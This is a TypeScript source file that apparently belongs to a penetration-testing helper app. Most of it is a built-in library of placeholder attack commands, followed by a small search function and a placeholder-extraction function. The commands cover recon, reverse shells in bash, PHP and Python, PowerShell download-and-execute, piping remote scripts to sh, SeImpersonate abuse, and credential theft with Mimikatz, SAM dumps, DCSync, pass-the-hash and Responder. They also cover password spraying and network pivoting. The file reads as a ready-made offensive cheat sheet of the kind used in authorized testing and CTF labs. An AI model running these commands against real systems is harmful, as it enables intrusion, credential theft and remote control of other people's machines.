import type { CommandSnippet } from '$lib/types';

let _id = 0;
const s = (f: Omit<CommandSnippet, 'id'>): CommandSnippet => ({ id: String(++_id), ...f });

export const DEFAULT_COMMANDS: CommandSnippet[] = [
  // ─── RECON ────────────────────────────────────────────────────────────────
  s({ category: 'recon', title: 'Nmap - Fast Full TCP Scan', tags: ['nmap', 'ports'],
    command: 'nmap -p- --min-rate 5000 -sV -sC -oA {OUTDIR}/nmap/full {TARGET_IP}',
    description: 'Full TCP scan with service & script detection' }),
  s({ category: 'recon', title: 'Nmap - UDP Top 20', tags: ['nmap', 'udp'],
    command: 'sudo nmap -sU --top-ports 20 --min-rate 1000 -oA {OUTDIR}/nmap/udp {TARGET_IP}',
    description: 'Fast UDP scan of top 20 ports' }),
  s({ category: 'recon', title: 'Nmap - Targeted Script Scan', tags: ['nmap', 'scripts'],
    command: 'nmap -p {PORTS} -sCV --script vuln,safe {TARGET_IP}',
    description: 'Run vuln & safe scripts against specific open ports' }),
  s({ category: 'recon', title: 'Nmap - OS Detection', tags: ['nmap', 'os'],
    command: 'sudo nmap -O -p {PORTS} {TARGET_IP}',
    description: 'Attempt OS fingerprinting' }),
  s({ category: 'recon', title: 'Ffuf - Directory Fuzz', tags: ['ffuf', 'web'],
    command: 'ffuf -u http://{TARGET_IP}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403 -t 50',
    description: 'Directory brute force with raft-medium wordlist' }),
  s({ category: 'recon', title: 'Ffuf - Subdomain / VHost Fuzz', tags: ['ffuf', 'dns'],
    command: 'ffuf -u http://FUZZ.{DOMAIN}/ -H "Host: FUZZ.{DOMAIN}" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc 200,301,302 -t 40',
    description: 'Virtual host / subdomain enumeration' }),
  s({ category: 'recon', title: 'Ffuf - File Extension Fuzz', tags: ['ffuf', 'web'],
    command: 'ffuf -u http://{TARGET_IP}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -e .php,.txt,.bak,.xml,.json,.conf -mc 200,301',
    description: 'Fuzz with file extensions' }),
  s({ category: 'recon', title: 'Feroxbuster - Recursive', tags: ['feroxbuster', 'web'],
    command: 'feroxbuster -u http://{TARGET_IP} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -d 3 -t 50',
    description: 'Recursive directory discovery' }),
  s({ category: 'recon', title: 'WhatWeb - Fingerprint', tags: ['whatweb'],
    command: 'whatweb -a 3 http://{TARGET_IP} | tee {OUTDIR}/whatweb.txt',
    description: 'Identify web technologies and versions' }),
  s({ category: 'recon', title: 'SMB - Enum4linux Full', tags: ['smb', 'enum4linux'],
    command: 'enum4linux -a {TARGET_IP} | tee {OUTDIR}/enum4linux.txt',
    description: 'Enumerate SMB shares, users, groups, policies' }),
  s({ category: 'recon', title: 'SMB - CrackMapExec Enum', tags: ['cme', 'smb'],
    command: "crackmapexec smb {TARGET_IP} -u '' -p '' --shares",
    description: 'Null session SMB share enumeration' }),
  s({ category: 'recon', title: 'SMB - smbclient List Shares', tags: ['smb', 'smbclient'],
    command: "smbclient -L //{TARGET_IP} -N",
    description: 'List SMB shares anonymously' }),
  s({ category: 'recon', title: 'LDAP - Anonymous Enum', tags: ['ldap', 'ad'],
    command: "ldapsearch -x -H ldap://{DC_IP} -b 'dc={DC1},dc={DC2}' | tee {OUTDIR}/ldap.txt",
    description: 'Anonymous LDAP dump of domain objects' }),
  s({ category: 'recon', title: 'DNS - Zone Transfer', tags: ['dns'],
    command: 'dig axfr @{DNS_SERVER} {DOMAIN}',
    description: 'Attempt AXFR zone transfer' }),
  s({ category: 'recon', title: 'SNMP - snmpwalk', tags: ['snmp'],
    command: 'snmpwalk -v2c -c public {TARGET_IP} | tee {OUTDIR}/snmp.txt',
    description: 'Walk SNMP MIB tree with community string public' }),

  // ─── EXPLOITATION ──────────────────────────────────────────────────────────
  s({ category: 'exploitation', title: 'Netcat - Listener', tags: ['nc', 'listener'],
    command: 'rlwrap nc -lvnp {LPORT}',
    description: 'Start reverse shell listener with readline support' }),
  s({ category: 'exploitation', title: 'Reverse Shell - Bash', tags: ['bash', 'revshell'],
    command: 'bash -c "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"',
    description: 'Bash TCP reverse shell one-liner' }),
  s({ category: 'exploitation', title: 'Reverse Shell - PHP', tags: ['php', 'revshell'],
    command: "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"sh <&3 >&3 2>&3\");'",
    description: 'PHP one-liner reverse shell' }),
  s({ category: 'exploitation', title: 'Reverse Shell - Python', tags: ['python', 'revshell'],
    command: "python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect((\"{LHOST}\",{LPORT})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/sh\",\"-i\"])'",
    description: 'Python3 reverse shell' }),
  s({ category: 'exploitation', title: 'Shell Upgrade - PTY', tags: ['pty', 'shell'],
    command: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# Then: Ctrl+Z  →  stty raw -echo; fg  →  export TERM=xterm",
    description: 'Upgrade shell to full interactive TTY' }),
  s({ category: 'exploitation', title: 'Evil-WinRM - Password', tags: ['evil-winrm'],
    command: 'evil-winrm -i {TARGET_IP} -u {USERNAME} -p {PASSWORD}',
    description: 'WinRM shell with cleartext credentials' }),
  s({ category: 'exploitation', title: 'Evil-WinRM - Pass the Hash', tags: ['evil-winrm', 'pth'],
    command: 'evil-winrm -i {TARGET_IP} -u {USERNAME} -H {NTLM_HASH}',
    description: 'WinRM shell with NTLM hash (PTH)' }),
  s({ category: 'exploitation', title: 'Impacket - psexec', tags: ['impacket', 'psexec'],
    command: 'impacket-psexec {DOMAIN}/{USERNAME}:{PASSWORD}@{TARGET_IP}',
    description: 'Get SYSTEM shell via SMB' }),
  s({ category: 'exploitation', title: 'Impacket - wmiexec', tags: ['impacket', 'wmi'],
    command: 'impacket-wmiexec {DOMAIN}/{USERNAME}:{PASSWORD}@{TARGET_IP}',
    description: 'Semi-interactive shell via WMI (leaves less traces)' }),
  s({ category: 'exploitation', title: 'SSH - Key Login', tags: ['ssh'],
    command: 'ssh -i {KEY_FILE} {USERNAME}@{TARGET_IP}',
    description: 'SSH with private key file' }),
  s({ category: 'exploitation', title: 'Searchsploit', tags: ['searchsploit'],
    command: 'searchsploit {SERVICE} {VERSION}',
    description: 'Search ExploitDB offline mirror' }),

  // ─── FILE TRANSFER ─────────────────────────────────────────────────────────
  s({ category: 'file-transfer', title: 'Python - HTTP Server', tags: ['python', 'http'],
    command: 'python3 -m http.server {PORT}',
    description: 'Serve current directory over HTTP' }),
  s({ category: 'file-transfer', title: 'Curl - Download', tags: ['curl'],
    command: 'curl -o {OUTFILE} http://{LHOST}:{PORT}/{FILE}',
    description: 'Download file from HTTP server' }),
  s({ category: 'file-transfer', title: 'Wget - Download', tags: ['wget'],
    command: 'wget http://{LHOST}:{PORT}/{FILE} -O {OUTFILE}',
    description: 'Download file using wget' }),
  s({ category: 'file-transfer', title: 'PowerShell - Download File', tags: ['powershell', 'windows'],
    command: '(New-Object Net.WebClient).DownloadFile("http://{LHOST}:{PORT}/{FILE}","C:\\Users\\Public\\{FILE}")',
    description: 'Download file to disk via PowerShell' }),
  s({ category: 'file-transfer', title: 'PowerShell - Download & Execute', tags: ['powershell', 'windows'],
    command: 'IEX(New-Object Net.WebClient).DownloadString("http://{LHOST}:{PORT}/{SCRIPT}")',
    description: 'In-memory download and execute PS script' }),
  s({ category: 'file-transfer', title: 'certutil - Download', tags: ['certutil', 'windows'],
    command: 'certutil -urlcache -split -f http://{LHOST}:{PORT}/{FILE} {OUTFILE}',
    description: 'LOLBIN download via certutil' }),
  s({ category: 'file-transfer', title: 'Impacket - SMB Server', tags: ['smbserver'],
    command: 'impacket-smbserver share . -smb2support',
    description: 'Host SMB share from current directory for Windows transfers' }),
  s({ category: 'file-transfer', title: 'NC - Send File', tags: ['nc'],
    command: 'nc -w 3 {TARGET_IP} {PORT} < {FILE}',
    description: 'Send a file via netcat' }),

  // ─── PRIVESC LINUX ─────────────────────────────────────────────────────────
  s({ category: 'privesc-linux', title: 'LinPEAS - Run from HTTP', tags: ['linpeas'],
    command: 'curl -L http://{LHOST}:{PORT}/linpeas.sh | sh',
    description: 'Download and run LinPEAS in memory' }),
  s({ category: 'privesc-linux', title: 'SUID - Find All', tags: ['suid'],
    command: 'find / -perm -4000 -type f 2>/dev/null',
    description: 'Find all SUID binaries on the system' }),
  s({ category: 'privesc-linux', title: 'Sudo - List Privileges', tags: ['sudo'],
    command: 'sudo -l',
    description: 'List all sudo permissions for current user' }),
  s({ category: 'privesc-linux', title: 'Capabilities - Find', tags: ['capabilities'],
    command: 'getcap -r / 2>/dev/null',
    description: 'Find all binaries with capabilities' }),
  s({ category: 'privesc-linux', title: 'Cron Jobs - View', tags: ['cron'],
    command: 'cat /etc/cron* /etc/crontab /var/spool/cron/crontabs/* 2>/dev/null; ls -la /etc/cron*',
    description: 'Show all scheduled cron jobs' }),
  s({ category: 'privesc-linux', title: 'Writable Files - Find', tags: ['writeable'],
    command: 'find / -writable -type f 2>/dev/null | grep -v /proc | grep -v /sys',
    description: 'Find world-writable files (excluding /proc, /sys)' }),
  s({ category: 'privesc-linux', title: 'Groups - Check Dangerous', tags: ['groups', 'docker'],
    command: 'id && groups',
    description: 'Check if in docker, lxd, disk, shadow or adm group' }),
  s({ category: 'privesc-linux', title: 'passwd - Writability Check', tags: ['passwd'],
    command: 'ls -la /etc/passwd /etc/shadow 2>/dev/null',
    description: 'Check if /etc/passwd or /etc/shadow are writable' }),

  // ─── PRIVESC WINDOWS ───────────────────────────────────────────────────────
  s({ category: 'privesc-windows', title: 'WinPEAS - Run', tags: ['winpeas'],
    command: '.\\winpeas.exe > C:\\Users\\Public\\winpeas.txt',
    description: 'Run WinPEAS and save output' }),
  s({ category: 'privesc-windows', title: 'whoami - Full Info', tags: ['whoami'],
    command: 'whoami /all',
    description: 'Show user, groups, and all privileges' }),
  s({ category: 'privesc-windows', title: 'PowerUp - AllChecks', tags: ['powerup'],
    command: 'IEX(New-Object Net.WebClient).DownloadString("http://{LHOST}:{PORT}/PowerUp.ps1"); Invoke-AllChecks',
    description: 'Run PowerUp privilege escalation checks' }),
  s({ category: 'privesc-windows', title: 'PrintSpoofer - SeImpersonate', tags: ['printspoofer', 'token'],
    command: '.\\PrintSpoofer.exe -c "nc.exe {LHOST} {LPORT} -e cmd"',
    description: 'Abuse SeImpersonatePrivilege (Win10/Server2019+)' }),
  s({ category: 'privesc-windows', title: 'SAM - Dump Hives', tags: ['registry', 'sam'],
    command: 'reg save HKLM\\SAM C:\\Users\\Public\\SAM.hive\nreg save HKLM\\SYSTEM C:\\Users\\Public\\SYSTEM.hive',
    description: 'Dump SAM and SYSTEM hives for offline cracking via impacket-secretsdump' }),
  s({ category: 'privesc-windows', title: 'Unquoted Service Paths', tags: ['services'],
    command: "Get-WmiObject Win32_Service | Where-Object {$_.PathName -notlike '\"*\"'} | Select Name,PathName",
    description: 'Find services with unquoted paths (spaces without quotes)' }),

  // ─── CREDENTIAL ATTACKS ────────────────────────────────────────────────────
  s({ category: 'credential-attacks', title: 'Responder - Start', tags: ['responder', 'llmnr'],
    command: 'sudo responder -I {INTERFACE} -wrf',
    description: 'Start Responder to capture NetNTLM hashes via LLMNR/NBT-NS poisoning' }),
  s({ category: 'credential-attacks', title: 'Hashcat - NTLM (1000)', tags: ['hashcat', 'ntlm'],
    command: 'hashcat -m 1000 {HASH_FILE} /usr/share/wordlists/rockyou.txt --force -O',
    description: 'Crack NTLM hashes with rockyou' }),
  s({ category: 'credential-attacks', title: 'Hashcat - NetNTLMv2 (5600)', tags: ['hashcat', 'netntlm'],
    command: 'hashcat -m 5600 {HASH_FILE} /usr/share/wordlists/rockyou.txt --force -O',
    description: 'Crack NetNTLMv2 captures from Responder' }),
  s({ category: 'credential-attacks', title: 'Hashcat - Kerberoast (13100)', tags: ['hashcat', 'kerberoast'],
    command: 'hashcat -m 13100 {HASH_FILE} /usr/share/wordlists/rockyou.txt --force -O',
    description: 'Crack Kerberos TGS hashes from kerberoasting' }),
  s({ category: 'credential-attacks', title: 'John - Crack', tags: ['john'],
    command: 'john --wordlist=/usr/share/wordlists/rockyou.txt {HASH_FILE}',
    description: 'Crack hashes with John the Ripper' }),
  s({ category: 'credential-attacks', title: 'CrackMapExec - Password Spray', tags: ['cme', 'spray'],
    command: 'crackmapexec smb {TARGET_IP} -u users.txt -p {PASSWORD} --continue-on-success',
    description: 'SMB password spray against a user list' }),
  s({ category: 'credential-attacks', title: 'Mimikatz - logonpasswords', tags: ['mimikatz', 'lsass'],
    command: '.\\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"',
    description: 'Dump cleartext credentials from LSASS memory' }),
  s({ category: 'credential-attacks', title: 'Impacket - secretsdump', tags: ['secretsdump'],
    command: 'impacket-secretsdump {DOMAIN}/{USERNAME}:{PASSWORD}@{TARGET_IP}',
    description: 'Dump all credentials from DC (DCSync) or local SAM/NTDS' }),
  s({ category: 'credential-attacks', title: 'Hydra - SSH Brute Force', tags: ['hydra', 'ssh'],
    command: 'hydra -l {USERNAME} -P /usr/share/wordlists/rockyou.txt ssh://{TARGET_IP}',
    description: 'Brute force SSH login' }),

  // ─── PIVOTING ──────────────────────────────────────────────────────────────
  s({ category: 'pivoting', title: 'Ligolo-ng - Setup Proxy (attacker)', tags: ['ligolo'],
    command: 'sudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert',
    description: 'Initialize Ligolo-ng tun interface and start proxy on attacker' }),
  s({ category: 'pivoting', title: 'Ligolo-ng - Agent (victim)', tags: ['ligolo'],
    command: './agent -connect {LHOST}:11601 -ignore-cert',
    description: 'Start Ligolo-ng agent on compromised host, connect back to proxy' }),
  s({ category: 'pivoting', title: 'Ligolo-ng - Add Route', tags: ['ligolo'],
    command: 'sudo ip route add {INTERNAL_SUBNET}/24 dev ligolo',
    description: 'Route internal subnet traffic through Ligolo tunnel (after session start in proxy)' }),
  s({ category: 'pivoting', title: 'SSH - SOCKS5 Dynamic Proxy', tags: ['ssh', 'socks'],
    command: 'ssh -D 1080 -N -f {USERNAME}@{JUMP_HOST}',
    description: 'Start SOCKS5 proxy through SSH jump host' }),
  s({ category: 'pivoting', title: 'SSH - Local Port Forward', tags: ['ssh', 'portfwd'],
    command: 'ssh -L {LOCAL_PORT}:{INTERNAL_IP}:{REMOTE_PORT} {USERNAME}@{JUMP_HOST}',
    description: 'Forward local port to internal service via SSH' }),
  s({ category: 'pivoting', title: 'Chisel - Server (attacker)', tags: ['chisel'],
    command: './chisel server -p 8080 --reverse',
    description: 'Start Chisel server with reverse tunneling enabled' }),
  s({ category: 'pivoting', title: 'Chisel - Client Reverse SOCKS5', tags: ['chisel'],
    command: './chisel client {LHOST}:8080 R:socks',
    description: 'Create reverse SOCKS5 proxy back to attacker via port 1080' }),
  s({ category: 'pivoting', title: 'Proxychains - Route Command', tags: ['proxychains'],
    command: 'proxychains -q {COMMAND}',
    description: 'Route a command through SOCKS proxy (configure /etc/proxychains4.conf)' }),

  // ─── ACTIVE DIRECTORY ──────────────────────────────────────────────────────
  s({ category: 'ad-attacks', title: 'BloodHound - SharpHound', tags: ['bloodhound', 'sharphound'],
    command: '.\\SharpHound.exe -c All --zipfilename bloodhound.zip',
    description: 'Collect all BloodHound data from domain-joined machine' }),
  s({ category: 'ad-attacks', title: 'BloodHound - bloodhound-python', tags: ['bloodhound', 'python'],
    command: 'bloodhound-python -u {USERNAME} -p {PASSWORD} -d {DOMAIN} -ns {DC_IP} -c All',
    description: 'Remote BloodHound collection (no domain join required)' }),
  s({ category: 'ad-attacks', title: 'Kerberoasting - Impacket', tags: ['kerberoast'],
    command: 'impacket-GetUserSPNs {DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {DC_IP} -request -outputfile kerberoast.hash',
    description: 'Request TGS tickets for all SPNs and save hashes' }),
  s({ category: 'ad-attacks', title: 'AS-REP Roasting', tags: ['asrep'],
    command: 'impacket-GetNPUsers {DOMAIN}/ -dc-ip {DC_IP} -no-pass -usersfile users.txt -outputfile asrep.hash',
    description: 'Dump AS-REP hashes for users without pre-auth required' }),
  s({ category: 'ad-attacks', title: 'DCSync - secretsdump', tags: ['dcsync', 'admin'],
    command: 'impacket-secretsdump -just-dc-user Administrator {DOMAIN}/{USERNAME}:{PASSWORD}@{DC_IP}',
    description: 'DCSync a specific account (requires Replication privileges)' }),
  s({ category: 'ad-attacks', title: 'CrackMapExec - Pass The Hash', tags: ['cme', 'pth'],
    command: 'crackmapexec smb {TARGET_RANGE} -u {USERNAME} -H {NTLM_HASH} --continue-on-success',
    description: 'Pass-the-hash attack against a range of SMB targets' }),
  s({ category: 'ad-attacks', title: 'Rubeus - Kerberoast', tags: ['rubeus', 'kerberoast'],
    command: '.\\Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast.txt',
    description: 'Kerberoast all SPNs, output in hashcat format' }),
  s({ category: 'ad-attacks', title: 'PowerView - Find Domain Admins', tags: ['powerview'],
    command: "IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}:{PORT}/PowerView.ps1'); Get-DomainUser -AdminCount | Select samaccountname",
    description: 'Enumerate all domain admin accounts via PowerView' }),
  s({ category: 'ad-attacks', title: 'CrackMapExec - LSASS Dump', tags: ['cme', 'lsass'],
    command: 'crackmapexec smb {TARGET_IP} -u {USERNAME} -p {PASSWORD} --lsa',
    description: 'Dump LSA secrets remotely via CrackMapExec' }),
];

/** Get commands matching a text query (case-insensitive substring) */
export function searchCommands(query: string, commands = DEFAULT_COMMANDS): CommandSnippet[] {
  if (!query.trim()) return commands;
  const q = query.toLowerCase();
  return commands.filter(
    (c) =>
      c.title.toLowerCase().includes(q) ||
      c.command.toLowerCase().includes(q) ||
      c.description?.toLowerCase().includes(q) ||
      c.tags.some((t) => t.includes(q)),
  );
}

/**
 * Extract all unique variable placeholder names from a list of command strings.
 * Matches {NAME} where NAME is [A-Z0-9_-]+ (uppercase letters, digits, underscores, hyphens).
 * Returns names sorted alphabetically.
 */
export function extractSnippetVarNames(commands: string[]): string[] {
  const names = new Set<string>();
  const re = /\{([A-Z0-9_-]+)\}/g;
  for (const cmd of commands) {
    // Use a fresh regex per command to avoid sticky lastIndex issues
    const local = new RegExp(re.source, 'g');
    let match: RegExpExecArray | null;
    while ((match = local.exec(cmd)) !== null) {
      names.add(match[1]);
    }
  }
  return [...names].sort();
}
